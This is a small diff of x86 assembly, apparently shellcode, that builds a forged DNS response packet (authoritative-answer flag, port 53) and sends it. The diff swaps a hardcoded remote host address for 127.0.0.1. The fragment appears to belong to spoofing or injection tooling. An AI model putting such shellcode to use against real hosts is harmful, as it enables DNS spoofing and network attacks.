@@ -53,8 +53,7 @@ sendto:
 	push dx               ; q.flags = 0x4 (AA)
 	push si               ; q.id = non-deterministic
 	mov  esi, esp
-	push dword 0x03a0f280
-;	push dword 0x0100007f ; RHOST
+	push dword 0x0100007f ; RHOST
 	mov  dh, 0x35         ; RPORT (53)
 	push dx
 	push bp
